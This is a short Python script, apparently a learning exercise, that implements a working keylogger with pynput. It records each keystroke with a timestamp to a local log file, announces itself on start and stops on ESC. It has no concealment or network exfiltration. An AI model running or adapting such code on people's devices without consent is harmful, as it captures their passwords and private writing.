from pynput import keyboard
import datetime

logFile = "log.txt"

def press(key):
    # gets current timestamp
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        # prints typical characters such as letters or numbers
        key = key.char
    except AttributeError:
        # prints special keys such as ctrl or shift, gets converted to string so that it could be logged
        key = str(key)

    # Opens log file and appends every key pressed as well as its timestamp
    with open(logFile, "a") as file:
        file.write(f"[{timestamp}] {key}\n")

def release(key):
    if key == keyboard.Key.esc:
        print("Logging stopped")
        return False


if __name__ == "__main__":
    print("Keylogger started, press ESC to exit")

    with keyboard.Listener(on_press=press, on_release=release) as listener:
        # listener remmains running until release() returns False
        listener.join()